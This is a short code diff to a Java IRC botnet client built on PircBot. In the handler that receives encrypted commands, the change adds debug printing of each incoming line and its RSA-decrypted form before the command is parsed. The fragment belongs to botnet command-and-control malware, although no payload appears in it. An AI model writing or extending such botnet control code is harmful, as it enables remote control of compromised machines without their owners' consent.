@@ -233,7 +233,10 @@ public class BotnetClient extends PircBot {
 					System.out.println(chat.getNick() + "<" + chat.getHostname() + " | " + chat.getNumericalAddress() + "> tried to use me" );
 				} else {
 					chat.accept();
-					String command = m.decryptRSA(chat.readLine());
+					String s2 = chat.readLine();
+					System.out.println(s2);
+					System.out.println(m.decryptRSA(s2));
+					String command = m.decryptRSA(s2);
 					if (command.equalsIgnoreCase("key")) {
 						//Read the key info using char.readLine(); 
 						//String otherKey = chat.readLine().replace("::", "\n").replace("-", "\r").replace("_", "\r\n");
